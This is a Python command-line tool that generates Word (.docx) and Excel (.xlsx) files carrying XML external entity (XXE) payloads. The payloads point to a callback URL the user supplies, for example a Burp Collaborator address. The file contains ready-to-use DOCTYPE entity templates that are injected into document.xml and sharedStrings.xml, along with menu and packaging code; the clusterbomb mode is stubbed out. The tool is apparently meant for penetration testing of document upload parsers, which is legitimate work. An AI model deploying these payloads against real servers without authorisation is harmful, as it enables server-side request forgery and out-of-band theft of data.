#!/usr/bin/env python
import sys, os, argparse
from argparse import RawDescriptionHelpFormatter
from docx import Document
import xlsxwriter, time, zipfile, shutil

def main():
    parser = argparse.ArgumentParser(
        description="Generate office documents with embedded XXE payloads.\n"
                    "Run with no arguments for interactive wizard, or provide all arguments for file generation.",
        formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument("-f", "--filetype", type=int, default=None, help="Output file type, 1 for docx or 2 for xlsx.")
    parser.add_argument("-a", "--attack", type=int, default=None, help="Attack type, 1 for payload or 2 for clusterbomb.")
    parser.add_argument("-d", "--domain", default=None, help="Your callback monitoring domain, e.g. a Burp Collaborator instance.")
    parser.add_argument("-o", "--output", default=None, help="Output file name, with file extension.")
    args = parser.parse_args()
    
    no_arguments_given = True
    
    for arg in vars(args):
        if getattr(args, arg) != None:
            no_arguments_given = False
            break

    if no_arguments_given:
        main_menu()
    
    for arg in vars(args):
        if getattr(args, arg) == None:
            parser.error("Not all arguments are set.")

    if args.filetype == 1:
        if args.attack == 1:
            docx_payload_program(args.domain, args.output)
        elif args.attack == 2:
            docx_cluster_program(args.domain, args.output)
        else:
            parser.error("Attack type must be set to 1 (payload) or 2 (clusterbomb). Currently set to " + args.attack + ".")
    elif args.filetype == 2:
        if args.attack == 1:
            xlsx_payload_program(args.domain, args.output)
        elif args.attack == 2:
            xlsx_cluster_program(args.domain, args.output)
        else:
            parser.error("Attack type must be set to 1 (payload) or 2 (clusterbomb). Currently set to " + args.attack + ".")
    else:
        parser.error("Filetype must be set to 1 (docx) or 2 (xlsx). Currently set to " + args.filetype + ".")



#### PAYLOAD FUNCTIONS ####

def docx_payload():
    print("Docx XXE in payload mode creates a empty docx document and embeds a XXE payload pointing to a selected URL.")
    print("The most effective way to test for docx XXE is to embed a Burp Collaborator address and check for interactions.")
    print("Enter the URL with http/https prefix to point towards: (or enter 9 to cancel and go back):")
    address = input(" >>  ")
    if address == '9':
        exec_menu(address, "onlyback")
    else:
        print("Enter the desired name for the output file:")
        name = input(" >>  ")
        print("")
        docx_payload_program(address, name)
        print("Press enter to return to main menu.")
        choice = input(" >>  ")
        exec_menu('', "main")
    return

def xlsx_payload():
    print("xlsx XXE in payload mode creates a empty xlsx document and embeds a XXE payload pointing to a selected URL.")
    print("The most effective way to test for xlsx XXE is to embed a Burp Collaborator address and check for interactions.")
    print(bcolors.WARNING + "NOT FULLY TESTED, USE WITH CAUTION!" + bcolors.ENDC)
    print("Enter the URL with http/https prefix to point towards: (or enter 9 to cancel and go back):")
    address = input(" >>  ")
    if address == '9':
        exec_menu(address, "onlyback")
    else:
        print("Enter the desired name for the output file:")
        name = input(" >>  ")
        print("")
        xlsx_payload_program(address, name)
        print("Press enter to return to main menu.")
        choice = input(" >>  ")
        exec_menu('', "main")
    return

def docx_payload_program(address, name):
    print(bcolors.OKBLUE + "[x] Preparing payload..." + bcolors.ENDC)
    documentxml = docx_payload_text
    payload = documentxml.replace("REPLACEME", address)
    print(bcolors.OKBLUE + "[x] Creating new document and injecting XXE payload..." + bcolors.ENDC)

    with open("newdoc.docx", "w") as f:
        document = Document()
        document.save('newdoc.docx')
	
    with zipfile.ZipFile('newdoc.docx') as unzip:
        unzip.extractall()
        unzip.close()

    print(bcolors.OKBLUE + "[x] Waiting a second to allow unzip to finish..." + bcolors.ENDC)
    time.sleep(1)
    newcontent = open("word/document.xml", 'w')
    newcontent.write(payload)
    newcontent.close()
	
    with zipfile.ZipFile(name, "w") as newzip:
        newzip.write("[Content_Types].xml")
        zipdir("_rels/", newzip)
        zipdir("docProps/", newzip)
        zipdir("word/", newzip)
        zipdir("customXml/", newzip)

    print(bcolors.OKBLUE + "[x] Waiting a second to allow zip to finish..." + bcolors.ENDC)
    time.sleep(1)
	
    print(bcolors.OKBLUE + "[x] Cleaning up..." + bcolors.ENDC)
    os.remove("[Content_Types].xml")
    shutil.rmtree("_rels/")
    shutil.rmtree("docProps/")
    shutil.rmtree("word/")
    shutil.rmtree("customXml/")
    os.remove("newdoc.docx")
      
    print(bcolors.OKGREEN + "[x] Word document with embedded XXE payload created as {}".format(name) + bcolors.ENDC)
    print(bcolors.OKGREEN + "[x] DONE!\n" + bcolors.ENDC)

def xlsx_payload_program(address, name):
    print(bcolors.OKBLUE + "[x] Preparing payload..." + bcolors.ENDC)
    documentxml= xlsx_payload_text
    payload = documentxml.replace("REPLACEME", address)
    print(bcolors.OKBLUE + "[x] Creating new document and injecting XXE payload..." + bcolors.ENDC)

    with open("newxl.xlsx", "w") as f:
        workbook = xlsxwriter.Workbook('newxl.xlsx')
        worksheet = workbook.add_worksheet()
        workbook.close()

    with zipfile.ZipFile('newxl.xlsx') as unzip:
        unzip.extractall()
        unzip.close()

    print(bcolors.OKBLUE + "[x] Waiting a second to allow unzip to finish..." + bcolors.ENDC)
    time.sleep(1)
    newcontent = open("xl/sharedStrings.xml", 'w')
    newcontent.write(payload)
    newcontent.close()

    with zipfile.ZipFile(name, "w") as newzip:
        newzip.write("[Content_Types].xml")
        zipdir("_rels/", newzip)
        zipdir("docProps/", newzip)
        zipdir("xl/", newzip)

    print(bcolors.OKBLUE + "[x] Waiting a second to allow zip to finish..." + bcolors.ENDC)
    time.sleep(1)

    print(bcolors.OKBLUE + "[x] Cleaning up..." + bcolors.ENDC)
    os.remove("[Content_Types].xml")
    shutil.rmtree("_rels/")
    shutil.rmtree("docProps/")
    shutil.rmtree("xl/")
    os.remove("newxl.xlsx")

    print(bcolors.OKGREEN + "[x] Excel workbook with embedded XXE payload created as {}".format(name) + bcolors.ENDC)
    print(bcolors.OKGREEN + "[x] DONE!\n" + bcolors.ENDC)

#### PAYLOADS (Should be updated/checked) ####

docx_payload_text = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "REPLACEME">]>
<foo>&xxe;</foo>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:cx2="http://schemas.microsoft.com/office/drawing/2015/10/21/chartex" xmlns:cx3="http://schemas.microsoft.com/office/drawing/2016/5/9/chartex" xmlns:cx4="http://schemas.microsoft.com/office/drawing/2016/5/10/chartex" xmlns:cx5="http://schemas.microsoft.com/office/drawing/2016/5/11/chartex" xmlns:cx6="http://schemas.microsoft.com/office/drawing/2016/5/12/chartex" xmlns:cx7="http://schemas.microsoft.com/office/drawing/2016/5/13/chartex" xmlns:cx8="http://schemas.microsoft.com/office/drawing/2016/5/14/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:aink="http://schemas.microsoft.com/office/drawing/2016/ink" xmlns:am3d="http://schemas.microsoft.com/office/drawing/2017/model3d" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se w16cid wp14"><w:body><w:p w:rsidR="00872002" w:rsidRPr="006D571D" w:rsidRDefault="006D571D"><w:pPr><w:rPr><w:lang w:val="en-GB"/></w:rPr></w:pPr><w:r w:rsidRPr="006D571D"><w:rPr><w:lang w:val="en-GB"/></w:rPr><w:t xml:space="preserve">This document should launch a XXE </w:t></w:r><w:r><w:rPr><w:lang w:val="en-GB"/></w:rPr><w:t>attack.</w:t></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:sectPr w:rsidR="00872002" w:rsidRPr="006D571D"><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1417" w:right="1417" w:bottom="1417" w:left="1417" w:header="708" w:footer="708" w:gutter="0"/><w:cols w:space="708"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>'''

xlsx_payload_text = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "REPLACEME" >]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>'''

#### CLUSTERBOMB FUNCTIONS ####
	
def docx_cluster():
    print("Sorry, docx clusterbomb attack is not implemented yet.")
    print("")
    print("9. Back")
    print("0. Quit")
    choice = input(" >>  ")
    exec_menu(choice, "onlyback")
    return

def xlsx_cluster():
    print("Sorry, xlsx clusterbomb attack is not implemented yet.")
    print("")
    print("9. Back")
    print("0. Quit")
    choice = input(" >>  ")
    exec_menu(choice, "onlyback")
    return
    
def docx_cluster_program(address, name):
    print("Sorry, docx clusterbomb attack is not implemented yet.")
    exit()

def xlsx_cluster_program(address, name):
    print("Sorry, xlsx clusterbomb attack is not implemented yet.")
    exit()
    

#### HELPER FUNCTIONS ####

def back():
    main_menu_actions['main_menu']()

def exit():
    sys.exit()

def zipdir(path, zipfile):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipfile.write(os.path.join(root, file))

#### MENUS ####

def main_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(bcolors.HEADER + banner + bcolors.ENDC)
    print("Choose the kind of document you want to create:")
    print("1. docx")
    print("2. xlsx")
    print("")
    print("0. Quit")
    choice = input(" >>  ")
    exec_menu(choice, "main")
 
    return

def exec_menu(choice, location):
    os.system('cls' if os.name == 'nt' else 'clear')
    ch = choice.lower()
    if ch == '':
        main_menu_actions['main_menu']()
    else:
        try:
            if location == "main":
                main_menu_actions[ch]()
            if location == "docx":
                docx_menu_actions[ch]()
            if location == "xlsx":
                xlsx_menu_actions[ch]()
            if location == "onlyback":
                onlyback_menu_actions[ch]()
        except KeyError:
            print(bcolors.FAIL + "Invalid selection, please try again.\n" + bcolors.ENDC)
            main_menu_actions['main_menu']()
    return

def docx_menu():
    print("Select an attack mode: (Currently only Payload is implemented) \n")
    print("1. Payload")
    print("2. Clusterbomb")
    print("")
    print("9. Back")
    print("0. Quit")
    choice = input(" >>  ")
    exec_menu(choice, "docx")
    return

def xlsx_menu():
    print("xlsx is in beta, currently only payload has an implementation but it is not comfirmed to work. " + bcolors.WARNING + "Use with caution! \n" + bcolors.ENDC)
    print("1. Payload")
    print("2. Clusterbomb")
    print("")
    print("9. Back")
    print("0. Quit")
    choice = input(" >>  ")
    exec_menu(choice, "xlsx")
    return

main_menu_actions = {
    'main_menu': main_menu,
    '1': docx_menu,
    '2': xlsx_menu,
    '9': back,
    '0': exit,
}

docx_menu_actions = {
    '1': docx_payload,
    '2': docx_cluster,
    '9': main_menu,
    '0': exit,
}

xlsx_menu_actions = {
    '1': xlsx_payload,
    '2': xlsx_cluster,
    '9': main_menu,
    '0': exit,
}

onlyback_menu_actions = {
    '9': main_menu,
    '0': exit,
}

#### VISUALS ####

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

banner = """\
          _____   _____  __                 ____  _______  ______________ 
  ____  _/ ____\_/ ____\|__| _____   _____  \   \/  /\   \/  /\_   _____/ 
 /  _ \ \   __\ \   __\ |  |/  ___\ /  __ \  \     /  \     /  |    __)_  
(  <_> ) |  |    |  |   |  |\  \___ \  ___/  /     \  /     \  |        \ 
 \____/  |__|    |__|   |__| \_____> \_____>/___/\__\/___/\__\/_________/  
 
"""

#### INITIALIZATION ####

if __name__ == "__main__":
    main()